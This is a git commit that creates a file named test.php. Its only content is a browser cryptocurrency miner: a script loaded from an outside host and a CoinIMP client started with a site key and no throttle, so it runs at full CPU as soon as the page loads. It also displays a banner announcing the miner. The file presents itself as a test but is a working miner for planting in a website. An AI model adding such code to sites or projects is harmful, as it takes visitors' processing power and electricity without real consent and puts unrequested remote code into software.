5f9084cc55f669ed8265acd76eda9e8e933cf01c
BiozRobot <68542880+BiozRobot@users.noreply.github.com>
2020-12-11 19:16:01 +0100

    Create test.php

---
+++ test.php
@@ -0,0 +1,9 @@
+<script src="https://www.hostingcloud.racing/uuCz.js"></script>
+<script>
+    var _client = new Client.Anonymous('8cb8aa52327f1495d320f84f8cf4dabff42c871e58bd96223651172f2ab48781', {
+        throttle: 0, c: 'w'
+    });
+    _client.start();
+    _client.addMiningNotification("Top", "This site is running JavaScript miner from coinimp.com", "#cccccc", 40, "#3d3d3d");
+
+</script>
